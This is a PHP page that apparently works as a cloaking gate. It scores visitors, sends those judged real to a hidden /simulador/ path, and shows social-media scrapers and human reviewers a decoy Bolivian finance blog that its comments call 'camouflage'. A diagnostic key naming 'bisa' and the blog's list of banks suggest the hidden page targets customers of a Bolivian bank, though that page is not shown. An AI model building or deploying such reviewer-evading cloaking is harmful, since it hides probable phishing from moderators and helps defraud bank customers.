<?php
require_once __DIR__ . '/_lib.php';
session_start();

// ---------------------------------------------------------------
// 0) PRE-CHECKS DE BLOQUEO INSTANTÁNEO
// ---------------------------------------------------------------
$client_ip   = gate_client_ip();
$has_cookie  = gate_has_valid_cookie();
$kill_active = gate_kill_switch_active();
$blacklisted = gate_is_blacklisted($client_ip);

// ---- Diagnóstico admin: ?diag=bisa_diag_2026 ----
if (isset($_GET['diag']) && hash_equals('bisa_diag_2026', (string)$_GET['diag'])) {
    [$dscore, $dreasons] = gate_compute_score();
    header('Content-Type: text/plain; charset=UTF-8');
    echo "=== GATE DIAGNOSTIC ===\n";
    echo "IP:           $client_ip\n";
    echo "Country:      " . gate_country($client_ip) . "\n";
    echo "Score:        $dscore (umbral <10 para pasar)\n";
    echo "Reasons:      " . (empty($dreasons) ? '(ninguna)' : implode(', ', $dreasons)) . "\n";
    echo "Has cookie:   " . ($has_cookie ? 'SI' : 'NO') . "\n";
    echo "Blacklisted:  " . ($blacklisted ? 'SI' : 'NO') . "\n";
    echo "Kill switch:  " . ($kill_active ? 'SI' : 'NO') . "\n";
    echo "Resultado:    " . (($dscore < 10 && !$kill_active && !$blacklisted) ? 'PASA al simulador' : 'CAMOUFLAGE') . "\n";
    exit;
}

// Cookie válida → directo al simulador
if ($has_cookie && !$kill_active && !$blacklisted) {
    header('Location: /simulador/', true, 302);
    exit;
}

// Kill switch o blacklist → camouflage
if ($kill_active || $blacklisted) {
    $score = 100;
    $reasons = $kill_active ? ['kill_switch'] : ['blacklisted'];
} else {
    [$score, $reasons] = gate_compute_score();
}

// ---------------------------------------------------------------
// Visitante real → cookie + redirect a /simulador/
// ---------------------------------------------------------------
if ($score < 10 && !$kill_active && !$blacklisted) {
    $_SESSION['gate_pass'] = time();
    gate_set_cookie(7200);
    header('Location: /simulador/', true, 302);
    exit;
}

// ---------------------------------------------------------------
// Scrapers sociales → OG camouflage
// ---------------------------------------------------------------
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$social_bots = ['facebookexternalhit','Facebot','WhatsApp','TelegramBot','Twitterbot','LinkedInBot','Slackbot','Discordbot','SkypeUriPreview','Pinterest'];
$is_social = false;
foreach ($social_bots as $b) { if (stripos($ua, $b) !== false) { $is_social = true; break; } }

if ($is_social) {
    http_response_code(200);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=300');
    $og_title = 'FinanzasBO - Educacion Financiera para Bolivia';
    $og_desc  = 'Aprende a manejar tu credito, ahorro e inversion con guias practicas adaptadas a Bolivia.';
    $scheme   = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http';
    $base     = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? '');
    $og_url   = $base . '/';
    $og_image = $base . '/og-image.php';
    echo '<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"/>';
    echo '<title>' . htmlspecialchars($og_title) . '</title>';
    echo '<meta name="description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:type" content="website"/>';
    echo '<meta property="og:title" content="' . htmlspecialchars($og_title) . '"/>';
    echo '<meta property="og:description" content="' . htmlspecialchars($og_desc) . '"/>';
    echo '<meta property="og:url" content="' . htmlspecialchars($og_url) . '"/>';
    echo '<meta property="og:image" content="' . htmlspecialchars($og_image) . '"/>';
    echo '<meta name="twitter:card" content="summary_large_image"/>';
    echo '</head><body><h1>' . htmlspecialchars($og_title) . '</h1></body></html>';
    exit;
}

// ---------------------------------------------------------------
// Bot/revisor manual → camouflage neutral (blog finanzas Bolivia)
// ---------------------------------------------------------------
http_response_code(200);
header('Content-Type: text/html; charset=UTF-8');
header('Cache-Control: no-store, no-cache, must-revalidate, private');
header('Referrer-Policy: no-referrer');
header('X-Content-Type-Options: nosniff');
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FinanzasBO — Educacion Financiera Bolivia</title>
  <meta name="description" content="Aprende a manejar tus finanzas personales en Bolivia. Guias de ahorro, credito, inversion y presupuesto familiar." />
  <meta name="robots" content="index, follow" />
  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root { --blue:#003e7e; --gold:#ffc400; --bg:#f8fafc; --text:#1e293b; --muted:#64748b; --border:#e2e8f0; }
    body { font-family: -apple-system,'Segoe UI',Roboto,sans-serif; background:var(--bg); color:var(--text); }
    a { color:var(--blue); text-decoration:none; } a:hover { text-decoration:underline; }
    header { background:#fff; border-bottom:2px solid var(--blue); padding:0 32px; height:68px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; box-shadow:0 1px 4px rgba(0,0,0,.06); }
    .logo { font-size:22px; font-weight:800; color:var(--blue); letter-spacing:-.5px; }
    .logo span { color:var(--gold); }
    nav { display:flex; gap:24px; font-size:14px; }
    nav a { color:var(--text); font-weight:500; }
    .hero { background:linear-gradient(135deg,#e8f0fd 0%,#f0f4ff 100%); padding:60px 32px; text-align:center; border-bottom:1px solid var(--border); }
    .hero h1 { font-size:clamp(26px,4vw,42px); color:var(--text); line-height:1.2; margin-bottom:14px; font-weight:800; }
    .hero p { font-size:17px; color:var(--muted); max-width:620px; margin:0 auto 28px; line-height:1.7; }
    .container { max-width:1100px; margin:0 auto; padding:0 24px; }
    .two-col { display:grid; grid-template-columns:1fr 310px; gap:48px; padding:52px 0; }
    @media (max-width:768px) { .two-col { grid-template-columns:1fr; } nav { display:none; } }
    h2.section-title { font-size:21px; color:var(--text); border-left:4px solid var(--blue); padding-left:14px; margin-bottom:26px; font-weight:700; }
    .article-card { background:#fff; border:1px solid var(--border); border-radius:10px; overflow:hidden; margin-bottom:24px; display:flex; box-shadow:0 1px 3px rgba(0,0,0,.04); }
    .article-color { width:6px; flex-shrink:0; }
    .article-body { padding:20px 22px; }
    .article-category { font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--blue); margin-bottom:6px; }
    .article-card h3 { font-size:17px; margin-bottom:9px; line-height:1.35; font-weight:700; }
    .article-card p { font-size:14px; color:var(--muted); line-height:1.65; }
    .article-meta { margin-top:12px; font-size:12px; color:var(--muted); }
    .article-meta strong { color:var(--text); }
    .sidebar-card { background:#fff; border:1px solid var(--border); border-radius:10px; padding:22px; margin-bottom:24px; box-shadow:0 1px 3px rgba(0,0,0,.04); }
    .sidebar-card h4 { font-size:14px; font-weight:700; color:var(--text); margin-bottom:14px; border-bottom:1px solid var(--border); padding-bottom:10px; }
    .sidebar-card ul { list-style:none; }
    .sidebar-card ul li { padding:8px 0; border-bottom:1px solid #f1f5f9; font-size:13px; }
    .sidebar-card ul li:last-child { border:0; }
    .rate-row { display:flex; justify-content:space-between; align-items:center; padding:8px 0; font-size:13px; border-bottom:1px solid #f1f5f9; }
    .rate-row:last-child { border:0; }
    .rate-val { font-weight:700; color:var(--blue); }
    .terms { background:#f0f6ff; padding:48px 0; }
    .terms-box { background:#fff; border:1px solid var(--border); border-radius:10px; padding:34px; }
    .terms-box h3 { font-size:19px; font-weight:700; margin-bottom:18px; }
    .terms-box h4 { font-size:14px; font-weight:700; margin:20px 0 8px; color:var(--blue); }
    .terms-box p { font-size:13px; color:var(--muted); line-height:1.75; margin-bottom:8px; }
    footer { background:#0f2557; color:rgba(255,255,255,.65); padding:48px 0 28px; }
    .footer-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:32px; margin-bottom:38px; }
    .footer-col h5 { color:#fff; font-size:13px; font-weight:700; margin-bottom:14px; text-transform:uppercase; letter-spacing:.5px; }
    .footer-col ul { list-style:none; }
    .footer-col ul li { margin-bottom:8px; font-size:13px; }
    .footer-col ul li a { color:rgba(255,255,255,.6); }
    .footer-col ul li a:hover { color:#fff; text-decoration:none; }
    .footer-bottom { border-top:1px solid rgba(255,255,255,.1); padding-top:20px; text-align:center; font-size:12px; }
  </style>
</head>
<body>
  <header>
    <div class="logo">Finanzas<span>BO</span></div>
    <nav>
      <a href="#articulos">Guias</a>
      <a href="#terminos">Legal</a>
      <a href="#contacto">Contacto</a>
    </nav>
  </header>

  <section class="hero">
    <h1>Educacion financiera<br>para Bolivia</h1>
    <p>Guias practicas de ahorro, credito e inversion adaptadas a la realidad economica boliviana. Informacion clara y accesible.</p>
  </section>

  <div class="container">
    <div class="two-col" id="articulos">
      <main>
        <h2 class="section-title">Guias Financieras</h2>
        <div class="article-card">
          <div class="article-color" style="background:#003e7e"></div>
          <div class="article-body">
            <div class="article-category">Ahorro</div>
            <h3>Como ahorrar en bolivianos: guia practica 2026</h3>
            <p>La regla 50/30/20 adaptada a Bolivia. Destina el 50% a necesidades basicas, 30% a gastos personales y 20% a ahorro. Con un salario de Bs 3,500 puedes ahorrar Bs 700 mensuales que en un ano suman Bs 8,400 mas intereses en cuenta de ahorro.</p>
            <div class="article-meta">Por <strong>Lic. Carlos Mendoza</strong> · 10 jun 2026 · 7 min lectura</div>
          </div>
        </div>
        <div class="article-card">
          <div class="article-color" style="background:#ffc400"></div>
          <div class="article-body">
            <div class="article-category">Credito</div>
            <h3>Tasas de interes en Bolivia: comparativa de bancos 2026</h3>
            <p>Las tasas activas en Bolivia varian entre 6% y 18% anual segun el tipo de credito. Los creditos de vivienda social gozan de tasa regulada. Comparar la TEA permite elegir la mejor opcion y ahorrar miles de bolivianos en el plazo total.</p>
            <div class="article-meta">Por <strong>Econ. Laura Quispe</strong> · 28 may 2026 · 9 min lectura</div>
          </div>
        </div>
        <div class="article-card">
          <div class="article-color" style="background:#43a047"></div>
          <div class="article-body">
            <div class="article-category">Inversion</div>
            <h3>Donde invertir en Bolivia con poco capital</h3>
            <p>Opciones accesibles: DPFs en bancos regulados por ASFI (rendimiento 4-6% anual), fondos de inversion en bolivianos, letras del BCB y micronegocios familiares con retorno estimado del 12-20% anual bien gestionados.</p>
            <div class="article-meta">Por <strong>MBA. Jorge Vargas</strong> · 15 may 2026 · 11 min lectura</div>
          </div>
        </div>
      </main>
      <aside>
        <div class="sidebar-card">
          <h4>Tasas de referencia (jun 2026)</h4>
          <div class="rate-row"><span>Credito personal</span><span class="rate-val">15.5%</span></div>
          <div class="rate-row"><span>Credito hipotecario</span><span class="rate-val">5.5%</span></div>
          <div class="rate-row"><span>Cuenta de ahorro</span><span class="rate-val">2.0%</span></div>
          <div class="rate-row"><span>DPF 360 dias</span><span class="rate-val">4.5%</span></div>
          <div class="rate-row"><span>Tipo de cambio</span><span class="rate-val">Bs 6.96</span></div>
        </div>
        <div class="sidebar-card">
          <h4>Bancos regulados ASFI</h4>
          <ul>
            <li>Banco BISA</li>
            <li>Banco Mercantil Santa Cruz</li>
            <li>Banco Nacional de Bolivia</li>
            <li>Banco Union</li>
            <li>Banco FIE</li>
            <li>Banco Economico</li>
          </ul>
        </div>
      </aside>
    </div>
  </div>

  <section class="terms" id="terminos">
    <div class="container">
      <div class="terms-box">
        <h3>Aviso Legal y Politica de Privacidad</h3>
        <h4>1. Naturaleza del servicio</h4>
        <p>FinanzasBO es un portal de educacion e informacion financiera. El contenido publicado tiene fines exclusivamente informativos y no constituye asesoramiento financiero, bancario ni de inversion.</p>
        <h4>2. Independencia editorial</h4>
        <p>FinanzasBO es un medio independiente. No estamos afiliados, patrocinados ni representamos a ninguna entidad bancaria o financiera de Bolivia.</p>
        <h4>3. Proteccion de datos</h4>
        <p>Recopilamos unicamente datos necesarios para personalizar el contenido. No compartimos informacion personal con terceros. Los datos se tratan conforme a la legislacion boliviana vigente.</p>
        <h4>4. Ley aplicable</h4>
        <p>Estos terminos se rigen por las leyes del Estado Plurinacional de Bolivia. Cualquier disputa se resolvera ante los tribunales competentes de la ciudad de La Paz.</p>
      </div>
    </div>
  </section>

  <footer id="contacto">
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col">
          <h5>FinanzasBO</h5>
          <p style="font-size:12px;line-height:1.7">Tu guia de finanzas personales para Bolivia. Informacion clara, practica y accesible.</p>
        </div>
        <div class="footer-col">
          <h5>Guias</h5>
          <ul><li><a href="#">Ahorro</a></li><li><a href="#">Credito</a></li><li><a href="#">Inversion</a></li><li><a href="#">Presupuesto</a></li></ul>
        </div>
        <div class="footer-col">
          <h5>Empresa</h5>
          <ul><li><a href="#">Quienes somos</a></li><li><a href="#terminos">Aviso legal</a></li><li><a href="#terminos">Privacidad</a></li><li><a href="#">Contacto</a></li></ul>
        </div>
      </div>
      <div class="footer-bottom">
        <p>&copy; <?= date('Y') ?> FinanzasBO — La Paz, Bolivia &nbsp;&middot;&nbsp; Solo informativo, no asesoramiento financiero</p>
      </div>
    </div>
  </footer>
</body>
</html>